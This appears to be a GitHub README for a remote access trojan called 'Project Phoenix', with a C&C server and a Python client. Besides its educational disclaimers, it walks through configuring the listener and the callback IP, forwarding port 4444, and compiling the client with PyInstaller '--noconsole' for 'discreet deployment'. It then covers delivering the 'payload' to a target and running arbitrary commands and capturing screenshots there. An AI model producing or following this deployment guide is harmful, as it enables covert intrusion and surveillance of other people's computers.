#Project Phoenix: A Modern Remote Access Tool (RAT)
⚠️ Disclaimer: This project is for educational and research purposes only. The creators are not responsible for any misuse of this software. Unauthorized access to computer systems is illegal. Use this tool only on systems you have explicit permission to test.

Project Phoenix is a comprehensive, open-source Remote Access Tool (RAT) designed to demonstrate the capabilities and techniques used in modern remote administration and cybersecurity research. It consists of a Command & Control (C&C) server and a lightweight, cross-platform client, providing a robust framework for understanding remote access concepts.

##🚀 Features
Cross-Platform Client: Built with Python for compatibility across Windows, Linux, and macOS.
Encrypted Communication: All communication between the client and server is secured to prevent eavesdropping.
Remote Command Execution: Execute arbitrary shell commands on the target system.
System Information Gathering: Retrieve detailed system information (OS, hardware, network config).
Real-Time Screenshot Capture: Capture screenshots from the target's screen.
Persistent Connection: The client is designed to maintain a stable connection and automatically reconnect if the connection is lost.
Stealthy Execution: Can be compiled into a standalone executable for discreet deployment.
#📋 System Requirements
Server (Your Machine)
Python 3.7+
Any modern OS (Windows, Linux, macOS)
Client (Target Machine)
Python 3.7+ (if running the .py script)
No dependencies required if running the compiled .exe file.
🛠️ Installation & Setup
Follow these steps to get Project Phoenix up and running.

##Step 1: Clone the Repository
bash
git clone https://github.com/your-username/project-phoenix.git
cd project-phoenix
##Step 2: Install Dependencies
Install the required Python libraries on your server machine.

bash
pip install -r requirements.txt
(Note: requirements.txt would contain pyautogui and any other server-side dependencies)

##Step 3: Configure the C&C Server
Open the server/server.py file.
Edit the HOST and PORT variables if necessary.
HOST = '0.0.0.0' is recommended to listen on all network interfaces.
PORT = 4444 is the default. Choose a port above 1024.
python
# --- EDIT THIS SECTION ---
HOST = '0.0.0.0'  # Listen on all available network interfaces
PORT = 4444        # The port you want to listen on
# -------------------------
##Step 4: Configure the RAT Client
Open the client/client.py file.
Crucially, you must edit the SERVER_HOST variable.
Replace 'YOUR_PUBLIC_IP_ADDRESS' with your machine's public IP address.
Ensure SERVER_PORT matches the port you set in server.py.
python
# --- EDIT THIS SECTION ---
SERVER_HOST = 'YOUR_PUBLIC_IP_ADDRESS' # MUST be your public IP
SERVER_PORT = 4444 # MUST match the port in server.py
# -------------------------
Step 5: Port Forwarding (CRITICAL)
For the client to connect to your server over the internet, you must forward the chosen port on your router.

Access your router's admin panel (usually 192.168.1.1).
Navigate to the "Port Forwarding" or "Virtual Server" section.
Create a rule to forward TCP traffic on your chosen PORT (e.g., 4444) to the local IP address of the machine running the server.
🚀 Execution Guide
##Step 1: Start the C&C Server (Listener)
On your machine, run the server script from the terminal.

bash
python server/server.py
You should see the output: [*] Listening on 0.0.0.0:4444. Your server is now active and waiting for incoming connections.

##Step 2: Prepare the Client Payload
You can run the client in two ways:

###Option A: Direct Python Execution

Requires Python to be installed on the target machine.
Simply run python client/client.py.
###Option B: Standalone Executable (Recommended)

This bundles the script into a single .exe file that runs without Python.
First, install PyInstaller: pip install pyinstaller
Then, compile the client:
bash
pyinstaller --onefile --noconsole client/client.py
The final payload will be located in dist/client.exe. This is the file you will deliver to the target.
Step 3: Deploy and Run the Client
Transfer the client.py script or client.exe to the target machine.
Execute the file.
Step 4: Control the Target
Once the client connects, your server terminal will display a confirmation message. You can now type commands and press Enter to send them to the target.

Available Commands:

info: Retrieves detailed system information.
screenshot: Captures the target's screen and sends it back.
exec <command>: Executes any system command (e.g., exec whoami, exec dir C:\).
help: Shows the list of available commands.
exit: Shuts down the server.
#🤝 Contributing
Contributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.

#📜 License
This project is licensed under the MIT License - see the LICENSE file for details.

#⚠️ Ethical Usage Reminder
This tool is intended for authorized security testing, educational demonstrations, and research. Do not use it for any illegal activities. You are responsible for your actions.
